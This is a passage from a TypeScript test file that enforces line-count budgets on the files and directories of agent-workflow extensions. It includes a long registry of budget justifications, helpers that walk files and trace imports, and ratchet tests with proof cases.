			"parseErrorBehaviours), the §5 scope-pin parser (ScopePin, EXPECTED_FILE_PATTERN, parseScopePin), " +
			"the QUAL-03 conditional Root Cause gate inputs (FIX_FRAMING_MARKERS, isFixFramed, RootCause, " +
			"parseRootCause), the whole-document validateSpec gate and renderSpecMarkdown -- a genuine growth " +
			"in a schema/validator module carrying this phase's own EARS-lite/scope-pin/root-cause forcing " +
			"functions, not incidental bloat. Re-measured 1161 raw lines across the same 1 file 2026-08-15 " +
			"(spec-schema.ts), rounded up to the next ten. RAISED 1170 -> 1680 by plan 09-07 (FLOW-02): a " +
			"second file, scorecard.ts, is the ambiguity scorecard -- AMBIGUITY_DIMENSIONS/SCORE_GATE/ " +
			"HARD_QUESTION_BUDGET/INTERVIEW_PERSPECTIVES, the numbered binding-order gateAmbiguity predicate, " +
			"nextQuestionSlot's rotation, and assumptionsFromUnmetFloors. Measured 519 raw lines (scorecard.ts) " +
			"+ 1161 raw lines (spec-schema.ts) = 1680 raw lines across 2 files 2026-08-15, already an exact " +
			"multiple of ten. RAISED 1680 -> 1700 in the same plan: quality-rules.test.ts's own magic-number " +
			"rule (QUAL-01) fired error-tier on scorecard.ts's four repeated `floor: 0.7` literals (each " +
			"nested inside an Object.freeze() call, which breaks isConstDeclarationPosition's parent walk) -- " +
			"fixed by naming DEFAULT_DIMENSION_FLOOR once and reusing it at all four sites, per this " +
			"repository's own rule that a repeated literal needs a named constant. Re-measured 532 raw lines " +
			"(scorecard.ts) + 1161 raw lines (spec-schema.ts) = 1693 raw lines across 2 files 2026-08-15, " +
			"rounded up to the next ten. RAISED 1700 -> 1870 by plan 09-08 (FLOW-02/FLOW-03): two new files -- " +
			"index.ts (the /grill command itself, this directory's first registerCommand( call, which is what " +
			"makes commandDirs discover this directory directly rather than only via DIRECTORY_BUDGETS' own " +
			"declared-ahead-of-time allowance) and scorecard-parse.ts (a small pure §8 table parser feeding " +
			"gateAmbiguity, kept out of index.ts specifically to leave WORKFLOW_TEXT_BUDGETS' 250-line grill " +
			"ceiling headroom for the skill body -- see that registry's own entry for this file). Measured " +
			"110 (index.ts) + 21 (scorecard-parse.ts) + 246 (scorecard.ts) + 689 (spec-schema.ts) = 1066 raw " +
			"lines across 4 files 2026-08-15, rounded up to the next ten. Re-measured 1,142 raw lines after spec-gate.ts and the settle hook were added, rounded up to the next ten. Re-measured 1,156 raw lines after scorecard.ts began deriving the overall score from the dimensions, rounded up to the next ten. Re-measured 1,160 raw lines after spec-gate.ts began refusing ids with no entry, rounded up to the next ten. Re-measured 1166 raw lines after the workflow commands began retiring each other's per-turn hooks, rounded up to the next ten. Re-measured 1158 raw lines after the unused assumption-stamp helper was removed, rounded up to the next ten. Re-measured 1161 raw lines after /grill began git-ignoring the harness state directories, rounded up to the next ten. Re-measured 1165 raw lines after /grill began refusing a slug with an earlier ledger, rounded up to the next ten",
	},
	{
		dir: ".pi/extensions/plan-ceremony",
		budget: 500,
		why: "plan 09-09 (FLOW-06) -- the first file of the /plan subsystem, plan-schema.ts: the task-line " +
			"parser (TASK_LINE_PATTERN, VERIFICATION_SEPARATOR, parseTaskLine), the whole-document scanner " +
			"(parsePlanTasks, malformed lines returned never dropped), the files-touched union " +
			"(filesTouchedUnion, /review's second drift-baseline input), the numbered binding-order " +
			"validatePlan gate (7 reject branches, coverage checked in both directions), and " +
			"renderPlanMarkdown. Named `plan-ceremony`, not `plan-mode`, specifically to avoid colliding " +
			"with the vendored Pi example's own concept (09-RESEARCH.md). This directory holds no " +
			"registerCommand( call yet (plan 09-10 wires the /plan command itself) and is not YET reachable " +
			"by commandDirs' present-but-undeclared check for that reason -- declared here anyway, ahead of " +
			"that check requiring it, per plan 09-05's identical precedent for .pi/extensions/grill. " +
			"Measured 556 raw lines across 1 file 2026-08-15 (plan-schema.ts), rounded up to the next ten. " +
			"RAISED 560 -> 580 in the same plan's Task 2: extractPathAndCommand switched from a FIRST-matching-" +
			"token search to a LAST-token check against EXPECTED_FILE_PATTERN (the first-token strategy " +
			"false-positived on ordinary prose words, discovered while constructing this plan's own " +
			"falsification fixtures -- see 09-09-SUMMARY.md's deviations), and VERIFICATION_SEPARATOR dropped " +
			"its trailing space to avoid an invisible-whitespace-dependent fixture. Re-measured 578 raw lines " +
			"across 1 file 2026-08-15, rounded up to the next ten. RAISED 580 -> 760 by plan 09-10 " +
			"(FLOW-06): two new files -- index.ts (the /plan command itself, this directory's first " +
			"registerCommand( call, which is what makes commandDirs discover this directory directly rather " +
			"than only via DIRECTORY_BUDGETS' own declared-ahead-of-time allowance) and requirement-ids.ts " +
			"(a small pure §3 requirement-id extractor feeding validatePlan's coverage argument, kept out of " +
			"index.ts specifically to leave WORKFLOW_TEXT_BUDGETS' 200-line plan ceiling headroom for the " +
			"skill body -- the same reason grill/scorecard-parse.ts was kept out of grill/index.ts). Measured " +
			"291 (plan-schema.ts) + 113 (index.ts) + 20 (requirement-ids.ts) = 424 raw lines across 3 files " +
			"2026-08-15, rounded up to the next ten. Re-measured 453 raw lines after the settle hook began gating PLAN.md, rounded up to the next ten. Re-measured 473 raw lines after requirement-ids.ts gained the shared entry parser, rounded up to the next ten. Re-measured 486 raw lines after the workflow commands began retiring each other's per-turn hooks, rounded up to the next ten RAISED 490 -> 500 (2026-10-13): plan-schema.ts gained planTurnBrief, the hidden per-turn note, moved out of the frozen-ceiling index.ts; 495 raw lines.",
	},
	{
		dir: ".pi/extensions/execute",
		budget: 970,
		why: "plan 09-11 (FLOW-09) -- the first file of the /execute subsystem, handoff.ts: the honest-degradation " +
			"probeSubagentAvailability (probing the minimum genuinely-needed subagent/bg_wait pair, never " +
			"reading the settings file), the pure buildHandoffPacket/renderHandoffPacket, and the real " +
			"measurePacketDelta -- built and unit-verified entirely offline, per this plan's own constraint that " +
			"pi-subagents (RB-07-02, OUTSTANDING) is never installed. This directory holds no registerCommand( " +
			"call yet (a later plan wires the /execute command itself) and is not YET reachable by commandDirs' " +
			"present-but-undeclared check for that reason -- declared here anyway, ahead of that check requiring " +
			"it, per plan 09-05's identical precedent for .pi/extensions/grill and plan 09-09's for " +
			".pi/extensions/plan-ceremony. Measured 169 raw lines across 1 file 2026-10-13 (handoff.ts), rounded " +
			"up to the next ten. RAISED 170 -> 370 by plan 09-13 (FLOW-07): progress.ts, the PROGRESS.md append " +
			"format, fail-closed driftAbort and per-run output slot. Measured 169 (handoff.ts) + 198 (progress.ts) = " +
			"367 raw lines across 2 files 2026-10-13, rounded up to the next ten. RAISED 370 -> 510 by plan 09-13 for index.ts, the /execute command: 169 + 198 + 142 = 509 raw lines across 3 files 2026-10-13, rounded up to the next ten. Re-measured 514 raw lines after the drift diff stopped hiding renames, rounded up to the next ten. Re-measured 564 raw lines after progress.ts began recording only the verification run, rounded up to the next ten. Re-measured 568 raw lines after index.ts began re-running the deterministic gate at settle, rounded up to the next ten. Re-measured 590 raw lines after progress.ts gained the pinned drift base, rounded up to the next ten. Re-measured 594 raw lines after progress.ts gained the shared recordedEntries parser, rounded up to the next ten. Re-measured 619 raw lines after progress.ts gained the fence-aware entry parser, rounded up to the next ten. Re-measured 651 raw lines after progress.ts began redacting and bounding output and excluding .pi/work/, rounded up to the next ten. Re-measured 686 raw lines after progress.ts began persisting rejected attempts per task, rounded up to the next ten. Re-measured 669 raw lines after handoff.ts switched to the shared requirement entry parser, rounded up to the next ten. Re-measured 673 raw lines after the delegated brief began naming its agent, rounded up to the next ten. Re-measured 681 raw lines after the deterministic gate began checking the work repo's changed files, rounded up to the next ten. Re-measured 701 raw lines after the verification run and the settle gate began requiring a clean working tree, rounded up to the next ten. Re-measured 782 raw lines after the attempt log, drift base and accepted entries moved to the signed ledger, rounded up to the next ten. Re-measured 805 raw lines after the user-approved --rebase-base re-pin was added, rounded up to the next ten. Re-measured 816 raw lines after the ledger file began naming its worktree, rounded up to the next ten Re-measured 843 raw lines 2026-10-13 (handoff.ts 154, index.ts 202, ledger.ts 147, progress.ts 340) after the task pin, rounded up to the next ten. Re-measured 858 raw lines 2026-10-13 (index.ts 217) after one evidence row per run, rounded up to the next ten. Re-measured 863 raw lines 2026-10-13 (index.ts 222) after binding the run to its own prompt, rounded up to the next ten. Re-measured 857 raw lines 2026-10-13 (index.ts 217) after the non-throwing tree read, rounded up to the next ten.. RAISED 860 -> 870 for the same /execute guard pre-check; 861 raw lines. RAISED 870 -> 900: the pin covers each task line, its requirement ids and a SPEC.md hash, and --repin re-pins them without moving the drift base; 896 raw lines (handoff.ts 153, index.ts 230, ledger.ts 173, progress.ts 340). RAISED 900 -> 970: the ledger keeps a copy of the pinned SPEC.md and --repin shows a line diff of changed task and SPEC lines; 964 raw lines (ledger.ts 241)",
	},
	{
		dir: ".pi/extensions/review",
		budget: 480,
		why: "plan 09-14 (FLOW-05) -- scope-drift.ts: the pure compareScope and the git-diff-backed changedFilesSince that make the scope pin machine-checkable. Measured 47 raw lines across 1 file 2026-10-13, rounded up to the next ten. RAISED 50 -> 290 by plan 09-15 (FLOW-08): index.ts (the /review command) and mr.ts (MR body from evidence, classify-then-exec openMr). Measured 47 + 123 + 117 = 287 raw lines across 3 files 2026-10-13, rounded up to the next ten. Re-measured 295 raw lines after index.ts began running the deterministic gate, rounded up to the next ten. Re-measured 297 raw lines after index.ts began requiring approval for undeclared changes, rounded up to the next ten. Re-measured 305 raw lines after mr.ts began passing the body as an argv element with no shell, rounded up to the next ten. Re-measured 336 raw lines after mr.ts gained the history and upstream preconditions, rounded up to the next ten. Re-measured 331 raw lines after mr.ts switched to the shared fence-aware entry parser, rounded up to the next ten. Re-measured 332 raw lines after the gate notice began naming only what runs, rounded up to the next ten. Re-measured 345 raw lines after the attempt log, drift base and accepted entries moved to the signed ledger, rounded up to the next ten. Re-measured 356 raw lines after the user-approved --rebase-base re-pin was added, rounded up to the next ten. Re-measured 366 raw lines after glab spawn errors began being reported by cause, rounded up to the next ten. Re-measured 375 raw lines after the MR source branch began being checked and passed explicitly, rounded up to the next ten. Re-measured 462 raw lines 2026-10-13 after the MR audit row, merge-base scope and verdict gating (index.ts 166, mr.ts 198, scope-drift.ts 98), rounded up to the next ten Re-measured 473 raw lines 2026-10-13 (index.ts 170, mr.ts 202, scope-drift.ts 101) after the task-pin check, the top-level path fix and the MR audit verdict fix, rounded up to the next ten.",
	},
	{
		dir: ".pi/extensions/todo.ts",
		budget: 0,
		why: "Phase 7 plan 08's vendored todo.ts is a FLAT top-level file (`.pi/extensions/todo.ts`, not a " +
			"nested `<subsystem>/index.ts`), so its own 3-segment path already IS what " +
			"`p.split('/').slice(0,3).join('/')` resolves to -- commandDirs names the file itself as its own " +
			"'directory'. filesInDir(this literal string) looks for paths starting with " +
			"'.pi/extensions/todo.ts/', which cannot exist for a file, so the total is structurally always 0; " +
			"this entry exists only to satisfy the completeness check for that edge case, not because any " +
			"sibling file could ever be hidden beside it -- todo.ts has no siblings by construction (it is a " +
			"flat file, not a directory). LOWERED 10 -> 0 by WR2-03: the measured total is 0, and 0 is what " +
			"the rounding rule yields, so 10 was ten lines of undeclared headroom in the one entry where the " +
			"correct figure is not even debatable",
	},
];

/** Raw line count, no stripping of any kind -- decision D-1 above. */
function countRawLines(relPath: string): number {
	return readFileSync(join(repoRoot(), relPath), "utf-8").split("\n").length;
}

/**
 * Every file beneath `rel` on disk, as repo-relative forward-slash paths.
 *
 * `rel` is not always a directory: `commandDirs`' `slice(0, 3)` resolves a
 * FLAT top-level command file (`.pi/extensions/todo.ts`, a 3-segment path)
 * to itself, so `filesInDir` can be called with a literal file path standing
 * in for a "directory" that has no children by construction. `existsSync`
 * alone does not distinguish a file from a directory -- `readdirSync` on a
 * file throws `ENOTDIR` -- so this checks `isDirectory()` explicitly and
 * returns no children for a non-directory path, which is exactly the correct
 * answer: a flat file cannot have a sibling hidden "beneath" it.
 */
function walkOnDisk(rel: string): string[] {
	const abs = join(repoRoot(), rel);
	if (!existsSync(abs) || !statSync(abs).isDirectory()) {
		return [];
	}
	const out: string[] = [];
	for (const entry of readdirSync(abs, { withFileTypes: true })) {
		const child = `${rel}/${entry.name}`;
		if (entry.isDirectory()) {
			out.push(...walkOnDisk(child));
		} else {
			out.push(child);
		}
	}
	return out;
}

/**
 * WR-05: a `.ts`/`.js` file that spells `registerCommand(` is a command
 * surface, wherever it sits.
 *
 * WR-04: non-throwing by construction. The prior version read the file
 * BEFORE any existence check, so a path still in the git index but deleted
 * on disk threw a raw ENOENT here -- and because `discoverWorkflowFiles()`
 * runs in this file's `describe` body (collection time, not inside an `it`),
 * that throw stopped the ENTIRE file from reporting any tests at all,
 * silently disabling FLOW-11's registry, the 80-line ceiling and the
 * completeness check together. A file that cannot be read now classifies as
 * `false` rather than throwing.
 */
function isCommandSource(p: string): boolean {
	if (!/\.(ts|js)$/.test(p)) {
		return false;
	}
	try {
		return readFileSync(join(repoRoot(), p), "utf-8").includes(COMMAND_MARKER);
	} catch {
		return false;
	}
}

/**
 * WR-03/WR-01 (iteration 3): every `.ts`/`.js` file ANYWHERE beneath
 * repo-relative `dir` -- RECURSIVE, existsSync-filtered, from the SAME
 * tracked+on-disk union {@link discoverWorkflowFiles} uses -- deliberately
 * NOT limited to files that individually pass {@link isCommandSource}, so a
 * sibling helper (the planted `grill/steps.ts` shape) is counted in the
 * directory total even though it never spells `registerCommand(` itself.
 * WR-01 (iteration 3): the prior version excluded any path with an extra `/`
 * segment past `dir`, so `.pi/extensions/workflows/helpers/big.ts` was never
 * summed at all -- one `mkdir` defeated the whole ratchet. `walkOnDisk`
 * already recurses; `trackedFiles(dir)` recurses too (`git ls-files` on a
 * directory pathspec), so dropping the depth filter is the entire fix.
 */
function filesInDir(dir: string): string[] {
	const union = new Set([...trackedFiles(dir), ...walkOnDisk(dir)]);
	return Array.from(union)
		.filter((p) => p.startsWith(`${dir}/`) && /\.(ts|js)$/.test(p))
		.filter((p) => existsSync(join(repoRoot(), p)))
		.sort();
}

/**
 * Union of the git index and the working tree (decision D-9): a 1,169-line
 * workflow file that is on disk but not yet committed must fail NOW, not at
 * the moment someone runs `git commit`. Filtered to `.ts`/`.js` under
 * `workflows/`, exactly `.md` under `prompts/`/`skills/` (decision D-10 --
 * Pi has exactly three ways a workflow can be authored: extension, prompt
 * template, skill), and -- WR-05 -- any OTHER `.ts`/`.js` under
 * `.pi/extensions/` that spells `registerCommand(` directly: discovery by
 * WHAT a file is, not by WHERE it sits, so a command surface added as a
 * sibling subsystem directory (Phase 9's `/grill`, `/plan`, `/execute`,
 * `/review` as `.pi/extensions/grill/index.ts` and friends) cannot land
 * unbudgeted just because it never touched `workflows/`.
 */
function discoverWorkflowFiles(): string[] {
	const tracked = [
		...trackedFiles(WORKFLOWS_DIR),
		...trackedFiles(PROMPTS_DIR),
		...trackedFiles(SKILLS_DIR),
		...trackedFiles(EXTENSIONS_DIR),
	];
	const onDisk = [
		...walkOnDisk(WORKFLOWS_DIR),
		...walkOnDisk(PROMPTS_DIR),
		...walkOnDisk(SKILLS_DIR),
		...walkOnDisk(EXTENSIONS_DIR),
	];
	const union = new Set([...tracked, ...onDisk]);
	return (
		Array.from(union)
			// WR-04: existence FIRST, before isCommandSource() ever reads a byte --
			// a file still in the git index but deleted on disk (`git rm --cached`,
			// or a delete not yet staged) must be dropped before any read is
			// attempted, not after. See {@link isCommandSource}'s own docstring for
			// what the prior ordering broke.
			.filter((p) => existsSync(join(repoRoot(), p)))
			.filter(
				(p) =>
					(p.startsWith(`${WORKFLOWS_DIR}/`) && /\.(ts|js)$/.test(p)) ||
					(p.startsWith(`${PROMPTS_DIR}/`) && p.endsWith(".md")) ||
					(p.startsWith(`${SKILLS_DIR}/`) && p.endsWith(".md")) ||
					(!p.startsWith(`${WORKFLOWS_DIR}/`) && p.startsWith(`${EXTENSIONS_DIR}/`) && isCommandSource(p)),
			)
			.sort()
	);
}

describe("FLOW-11 -- workflow line budgets enforce, both directions", () => {
	const discovered = discoverWorkflowFiles();

	it("finds at least one workflow file (guards against a vacuous pass)", () => {
		expect(
			discovered.length,
			"discoverWorkflowFiles() found nothing under .pi/extensions/workflows, .pi/prompts or " +
				".pi/skills -- without this guard every assertion below would pass having checked nothing",
		).toBeGreaterThanOrEqual(1);
	});

	it("declares at least one budget entry (guards against a vacuous pass)", () => {
		expect(
			WORKFLOW_BUDGETS.length,
			"WORKFLOW_BUDGETS is empty -- without this guard the per-file loop below would iterate " +
				"nothing and pass having asserted nothing",
		).toBeGreaterThanOrEqual(1);
	});

	it.each(WORKFLOW_BUDGETS)("$file stays within its declared budget", (entry) => {
		const actual = countRawLines(entry.file);
		expect(
			actual,
			`${entry.file} is ${actual} raw lines, over its budget of ${entry.budget} (${entry.why}) -- ` +
				"shorten the file, or raise the budget here with a reason -- do not move lines into a " +
				"private helper, the per-directory ratchets below are what catches that",
		).toBeLessThanOrEqual(entry.budget);
	});

	it.each(WORKFLOW_BUDGETS)("$file's budget IS the measured figure rounded up to the next ten", (entry) => {
		// WR2-03. Every `why` in this registry restates the rule -- "measured N raw
		// lines ... rounded up to the next ten" -- and restating a rule is not
		// enforcing it. Re-measured with countRawLines, the function the assertions
		// actually use, five of six raises granted TEN MORE lines than the stated
		// rule yields, and several `why` figures were CONTENT-line counts (one
		// short per file), i.e. produced by a different method than the one
		// documented. Individually harmless; collectively the audit trail stopped
		// being checkable, and a ratchet whose numbers cannot be reproduced by its
		// own documented method is slack with a paper trail.
		//
		// So the rule is asserted rather than restated. `toBe` and not
		// `toBeLessThan(actual + 10)`: the registry must state the CURRENT measured
		// figure, so a file that SHRINKS also requires the edit. That is the point
		// -- headroom accumulated by shrinking is exactly the slack a ratchet
		// exists to prevent, and it accumulates silently.
		const actual = countRawLines(entry.file);
		const expected = Math.ceil(actual / 10) * 10;
		expect(
			entry.budget,
			`${entry.file} is ${actual} raw lines, so its budget must be ${expected} -- the next multiple of ` +
				`ten, which is the rule every 'why' in this registry states. It is declared as ${entry.budget}. ` +
				"Update the number AND the measured figure in its `why`, in the same commit as the change that " +
				"moved it",
		).toBe(expected);
	});

	it("/quick (index.ts) never exceeds the explicit 100-line ceiling", () => {
		// RAISED 80 -> 100 by plan 08-11 (GATE-01 wiring), in the SAME commit as
		// the WORKFLOW_BUDGETS entry above -- a registry edit ALONE still cannot
		// quietly relax this: both this literal number and that entry had to
		// move together, visibly, for /quick to grow at all. The ROADMAP's own
		// "above 100 it has FAILED" line is the real ceiling this explicit,
		// greppable assertion still holds well under.
		const actual = countRawLines(".pi/extensions/workflows/index.ts");
		expect(
			actual,
			`.pi/extensions/workflows/index.ts is ${actual} raw lines -- the ROADMAP states that ` +
				'"above 100 it has FAILED"; this explicit, greppable assertion holds it to 100, and ' +
				"a registry edit alone cannot quietly relax it",
		).toBeLessThanOrEqual(100);
	});
});

/**
 * WR2-04 (`08-REVIEW.md` iteration 2): resolve one relative import
 * `specifier` written inside `fromFile` to a repo-relative path, but ONLY
 * when it names a real, resolvable `.ts`/`.js` file (itself, or its own
 * `index.ts`/`index.js` if the specifier names a directory) -- never a bare
 * package specifier (no leading `./`/`../`, filtered by the caller's own
 * regex) and never a specifier that resolves to nothing on disk.
 */
function resolveLocalImport(fromFile: string, specifier: string): string | undefined {
	const raw = resolve(dirname(join(repoRoot(), fromFile)), specifier);
	const candidates = [raw, `${raw}.ts`, `${raw}.js`, join(raw, "index.ts"), join(raw, "index.js")];
	for (const candidate of candidates) {
		if (existsSync(candidate) && statSync(candidate).isFile()) {
			return relative(repoRoot(), candidate).split("\\").join("/");
		}
	}
	return undefined;
}

/**
 * CR-04, WIDENED by WR2-04 (`08-REVIEW.md` iteration 2): every LOCAL
 * (`.pi/`) directory reachable, TRANSITIVELY, by following the import graph
 * outward from `commandFiles` -- closing the discovery hole
 * {@link isCommandSource}-based `commandDirs` cannot see on its own.
 * `.pi/extensions/quality/` spells `registerCommand(` NOWHERE (it registers
 * zero commands -- `workflows/index.ts` is the only command surface `/quick`
 * has), yet `workflows/index.ts:12` imports `runQuickGateStage` from it and
 * `:42` calls it -- 3,400+ lines of the gate stage this budget exists to
 * bound were invisible to `commandDirs` for exactly that reason.
 *
 * TWO residuals CR-04's original version left, both closed here:
 *
 * 1. DEPTH 1 ONLY. CR-04 scanned only `commandFiles` themselves -- a
 *    directory imported by `quality/reviewer.ts` (not by `workflows/
 *    index.ts` directly) was invisible. This function now does a fixed-point
 *    walk: every file it resolves a LOCAL import to is itself scanned for
 *    its OWN local imports, seeded from `commandFiles` and iterated until no
 *    new file is discovered (a `visitedFiles` set makes this terminate on
 *    any import cycle). A future subsystem reached only by TRANSITIVE import
 *    (Phase 9's `/grill`, `/plan`, `/execute`, `/review` delegating into
 *    sibling directories through an intermediate file) is now caught the
 *    same way `quality/` was, without needing its own `registerCommand(`
 *    call anywhere in the chain.
 * 2. `.pi/extensions/`-ONLY. CR-04's filter (`rel.startsWith(EXTENSIONS_DIR)`)
 *    discarded every local import outside `.pi/extensions/` by construction
 *    -- `.pi/lib/jsonl.ts` (605+ lines, imported by five subsystems including
 *    `workflows/evidence.ts`) had no `DIRECTORY_BUDGETS` entry despite being
 *    a live, unbudgeted import target. A hit under `.pi/extensions/` still
 *    maps to its SUBSYSTEM ROOT (matching `commandDirs`' own `slice(0, 3)`
 *    convention, so a file nested arbitrarily deep inside one subsystem does
 *    not fragment into its own sub-entry); a hit under any OTHER `.pi/`
 *    directory maps to its own immediate directory (`.pi/lib`, for example --
 *    shallow by construction, so `dirname` already IS the right boundary).
 *    Anything the resolved path does NOT start with `.pi/` (a test helper, a
 *    doc) is left out entirely -- not local harness code this ratchet's own
 *    stated scope (D-11, WR-03) ever claimed to cover.
 */
function importedSubsystemDirs(commandFiles: readonly string[]): string[] {
	const dirs = new Set<string>();
	const visitedFiles = new Set<string>();
	const queue: string[] = [...commandFiles];
	while (queue.length > 0) {
		const file = queue.shift();
		if (file === undefined || visitedFiles.has(file)) continue;
		visitedFiles.add(file);
		let text: string;
		try {
			text = readFileSync(join(repoRoot(), file), "utf-8");
		} catch {
			continue;
		}
		for (const m of text.matchAll(/\bfrom\s+["'](\.\.?\/[^"']+)["']/g)) {
			const specifier = m[1];
			if (specifier === undefined) continue;
			const resolved = resolveLocalImport(file, specifier);
			if (resolved === undefined) continue;
			if (resolved.startsWith(`${EXTENSIONS_DIR}/`)) {
				dirs.add(resolved.split("/").slice(0, 3).join("/"));
			} else if (resolved.startsWith(".pi/")) {
				dirs.add(dirname(resolved));
			}
			if (!visitedFiles.has(resolved)) {
				queue.push(resolved);
			}
		}
	}
	return [...dirs];
}

/**
 * D-11 / WR-03 -- the directory-level anti-offloading ratchets. Every
 * directory that HOLDS a discovered command source gets its own ratchet
 * over the directory's WHOLE `.ts`/`.js` total (via {@link filesInDir}) --
 * not merely the files WORKFLOW_BUDGETS happens to name individually. This
 * is what stops a large sibling helper from hiding beside a small command
 * file: the exact hole `.pi/extensions/grill/steps.ts` (planted, 1,200
 * lines, no `registerCommand(`) demonstrated beside `grill/index.ts`
 * (planted, 3 lines, spells `registerCommand(`) -- the OLD single-directory
 * (`workflows/`-only) aggregate never looked at `grill/` at all, and the
 * per-file completeness check named only `index.ts`.
 *
 * CR-04 -- WIDENED to also ratchet every directory a discovered command
 * source IMPORTS (via {@link importedSubsystemDirs}), not only directories
 * that themselves spell `registerCommand(`. `.pi/extensions/quality/` is
 * the concrete case: it registers no command, but `workflows/index.ts`
 * calls straight into it, and its 3,400+ lines were unbudgeted until this
 * widening.
 */
describe("FLOW-11 / WR-03 -- directory-level anti-offloading ratchets", () => {
	const discovered = discoverWorkflowFiles();
	const commandFiles = discovered.filter(isCommandSource);
	// WR-01 (iteration 3): the SUBSYSTEM ROOT (`.pi/extensions/<name>`), not the
	// command file's immediate parent -- `.pi/extensions/grill/sub/index.ts`
	// must ratchet `.pi/extensions/grill`, not `.pi/extensions/grill/sub`, or a
	// command file nested one level deeper leaves its own parent uncounted.
	// CR-04: unioned with every directory a command source IMPORTS directly.
	const commandDirs = Array.from(
		new Set([...commandFiles.map((p) => p.split("/").slice(0, 3).join("/")), ...importedSubsystemDirs(commandFiles)]),
	).sort();

	it("finds at least one command directory (guards against a vacuous pass)", () => {
		expect(
			commandDirs.length,
			"no directory in this repository holds a discovered command source -- without this guard every " +
				"assertion below would pass having checked nothing",
		).toBeGreaterThanOrEqual(1);
	});

	it("declares at least one directory budget entry (guards against a vacuous pass)", () => {
		expect(DIRECTORY_BUDGETS.length, "DIRECTORY_BUDGETS is empty -- the per-directory loop below would assert nothing").toBeGreaterThanOrEqual(1);
	});

	it("present-but-undeclared: every directory holding a command source has a DIRECTORY_BUDGETS entry", () => {
		const declaredDirs = DIRECTORY_BUDGETS.map((e) => e.dir);
		const offenders = commandDirs.filter((d) => !declaredDirs.includes(d));
		expect(
			offenders,
			"WR-03: a command directory with no directory-level budget can hide an unbounded sibling file " +
				"beside its command file -- add each of these to DIRECTORY_BUDGETS with a number and a reason",
		).toEqual([]);
	});

	it.each(DIRECTORY_BUDGETS)("$dir's WHOLE .ts/.js total stays within its declared directory budget", (entry) => {
		const files = filesInDir(entry.dir);
		const total = files.reduce((sum, f) => sum + countRawLines(f), 0);
		expect(
			total,
			`${entry.dir} totals ${total} raw lines across ${files.length} files, over its directory ` +
				`budget of ${entry.budget} (${entry.why}) -- this is the anti-offloading control; a file that ` +
				"does not itself spell registerCommand( still counts toward this total",
		).toBeLessThanOrEqual(entry.budget);
	});

	it.each(DIRECTORY_BUDGETS)("$dir's budget IS the measured total rounded up to the next ten", (entry) => {
		// WR2-03, the directory half. Same reasoning as the per-file case above --
		// and this is where the drift was largest: the checkpoint directory's `why`
		// summed three content-line counts (229+374+330=933) while countRawLines
		// gave 936, and its budget of 940 was ten above what the rule yields for
		// either figure. `.pi/extensions/todo.ts` is included deliberately: it is a
		// flat file, filesInDir returns nothing for it, the measured total is 0,
		// and 0 is therefore the correct budget. It carried 10.
		const files = filesInDir(entry.dir);
		const total = files.reduce((sum, f) => sum + countRawLines(f), 0);
		const expected = Math.ceil(total / 10) * 10;
		expect(
			entry.budget,
			`${entry.dir} totals ${total} raw lines across ${files.length} files ` +
				`(${files.map((f) => `${f.split("/").pop()} ${countRawLines(f)}`).join(", ") || "none"}), so its ` +
				`budget must be ${expected}. It is declared as ${entry.budget}. Update the number AND the ` +
				"measured figure in its `why`, in the same commit as the change that moved it",
		).toBe(expected);
	});

	it("WR-03 proof: filesInDir counts a sibling file that does NOT itself spell registerCommand( (routing/modes.ts)", () => {
		const files = filesInDir(".pi/extensions/routing");
		expect(files, "routing/modes.ts must be counted in the directory total").toContain(".pi/extensions/routing/modes.ts");
		expect(
			isCommandSource(".pi/extensions/routing/modes.ts"),
			"modes.ts does not itself register a command -- this is exactly the grill/steps.ts shape: " +
				"present in the directory total, absent from isCommandSource",
		).toBe(false);
	});

	it("WR-01 (iteration 3) proof: filesInDir counts a file nested one directory DEEPER than the command file, not merely a flat sibling", () => {
		// The exact hole the reviewer demonstrated: a helper one path segment
		// deeper than any command file, which the OLD depth filter
		// (`!p.slice(dir.length + 1).includes("/")`) silently excluded from
		// every directory total. Planted for the duration of this one `it`
		// only -- discoverWorkflowFiles()'s own describe-body snapshots were
		// already taken at collection time, so this fixture cannot leak into
		// the completeness/registry checks above.
		const nestedDir = join(repoRoot(), WORKFLOWS_DIR, "wr01-probe", "nested");
		const nestedFile = join(nestedDir, "probe.ts");
		mkdirSync(nestedDir, { recursive: true });
		writeFileSync(nestedFile, "// WR-01 iteration 3 regression fixture -- never spells registerCommand(\n", "utf-8");
		try {
			const files = filesInDir(WORKFLOWS_DIR);
			expect(
				files,
				"a .ts file nested beneath a subdirectory of WORKFLOWS_DIR must be counted in the directory " +
					"total -- the OLD filter excluded anything with an extra path segment past dir",
			).toContain(`${WORKFLOWS_DIR}/wr01-probe/nested/probe.ts`);
		} finally {
			rmSync(join(repoRoot(), WORKFLOWS_DIR, "wr01-probe"), { recursive: true, force: true });
		}
	});

	it("WR-01 (iteration 3) proof: commandDirs resolves to the subsystem root, not a command file's immediate (possibly nested) parent", () => {
		// .pi/extensions/<subsystem>/index.ts -- every real command source in
		// this repository sits exactly one level below its subsystem root, so
		// slice(0, 3) already coincides with the immediate parent for every
		// EXISTING file; this assertion pins that the mechanism is the
		// subsystem root by construction, not an accident of today's flat
		// layout (a nested `.pi/extensions/grill/sub/index.ts` would resolve
		// to `.pi/extensions/grill`, per the module docstring's WR-01 section).
		expect(WORKFLOWS_DIR.split("/").slice(0, 3).join("/")).toBe(WORKFLOWS_DIR);
		expect(`${WORKFLOWS_DIR}/index.ts`.split("/").slice(0, 3).join("/")).toBe(WORKFLOWS_DIR);
	});

	it(
		"CR-04 proof: commandDirs includes .pi/extensions/quality via IMPORT, even though quality/ spells " +
			"registerCommand( nowhere -- the exact discovery hole the review demonstrated",
		() => {
			expect(
				isCommandSource(".pi/extensions/quality/index.ts"),
				"quality/index.ts must NOT itself spell registerCommand( -- if it ever does, this proof is " +
					"testing the wrong mechanism (isCommandSource, not importedSubsystemDirs)",
			).toBe(false);
			expect(
				commandDirs,
				"workflows/index.ts imports runQuickGateStage from ../quality/index.ts and calls it -- " +
					"commandDirs must include .pi/extensions/quality via importedSubsystemDirs, not only via " +
					"isCommandSource, or 3,400+ lines of gate/leg logic stay invisible to every ratchet below",
			).toContain(".pi/extensions/quality");
		},
	);

	it("CR-04 proof: importedSubsystemDirs resolves a relative import to its SUBSYSTEM ROOT, not the imported file's own path", () => {
		// Direct proof of the resolution arithmetic, independent of whatever
		// workflows/index.ts happens to import today: a command file importing
		// "../quality/index.ts" must resolve to ".pi/extensions/quality" (the
		// subsystem root, matching commandDirs' own slice(0,3) convention), not
		// ".pi/extensions/quality/index.ts" (the file itself).
